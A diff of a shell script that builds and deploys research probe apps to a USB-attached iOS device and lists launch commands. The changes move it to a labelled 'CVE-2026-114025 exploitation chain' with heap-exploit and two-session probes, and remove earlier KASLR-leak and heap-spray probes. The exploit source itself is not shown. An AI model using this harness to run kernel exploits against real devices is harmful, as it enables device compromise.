@@ -14,14 +14,12 @@ UDID="${1:-$(pymobiledevice3 usbmux list --usb 2>/dev/null | python3 -c "import 
 if [ -z "$UDID" ]; then echo "ERROR: No USB device found"; exit 1; fi
 echo "Target UDID: $UDID"
 
-# Probe definitions: name, bundle_id, source_file
+# Priority probes (CVE-2026-114025 exploitation chain)
 declare -a PROBES=(
+    "AVEProbe114:com.research.aveprobe114:ave_114025_probe.c"
+    "AVEHeapExploit:com.research.aveheap:ave_heap_exploit.c"
+    "AVETwoSession:com.research.avetwosession:ave_two_session.c"
     "AVEPixel:com.research.avepixel:ave_pixeldata_probe.c"
-    "AVESurgical:com.research.avesurgical:ave_dma_surgical.c"
-    "AVEPipe:com.research.avepipe:ave_pipe_probe.c"
-    "AVEKaslr:com.research.avekaslr:ave_kaslr_leak.c"
-    "AVEChain:com.research.avechain:ave_full_chain.c"
-    "AVESpray:com.research.avespray:ave_heap_spray.c"
 )
 
 build_and_deploy() {
@@ -118,10 +116,10 @@ echo "============================================"
 echo "  Deployment Complete: $OK ok, $FAIL failed"
 echo "============================================"
 echo ""
-echo "Test sequence (priority order):"
-echo "  1. pymobiledevice3 developer dvt launch --udid $UDID 'com.research.avepixel baseline'"
-echo "  2. pymobiledevice3 developer dvt launch --udid $UDID 'com.research.avepixel pixel_ntl9'"
-echo "  3. pymobiledevice3 developer dvt launch --udid $UDID 'com.research.avepixel multi_round'"
-echo "  4. pymobiledevice3 developer dvt launch --udid $UDID 'com.research.avepixel pixel_ntl16'"
-echo "  5. pymobiledevice3 developer dvt launch --udid $UDID 'com.research.avesurgical spray_ntl9'"
-echo "  6. pymobiledevice3 developer dvt launch --udid $UDID 'com.research.avekaslr spray_leak'"
+echo "Test sequence (CVE-2026-114025 exploitation):"
+echo "  1. pymobiledevice3 developer dvt launch --udid $UDID 'com.research.aveprobe114 scan'"
+echo "  2. pymobiledevice3 developer dvt launch --udid $UDID 'com.research.aveheap safe'"
+echo "  3. pymobiledevice3 developer dvt launch --udid $UDID 'com.research.aveheap boundary'"
+echo "  4. pymobiledevice3 developer dvt launch --udid $UDID 'com.research.avetwosession max'"
+echo "  5. pymobiledevice3 developer dvt launch --udid $UDID 'com.research.avetwosession test'"
+echo "  6. pymobiledevice3 developer dvt launch --udid $UDID 'com.research.avetwosession sweep'"
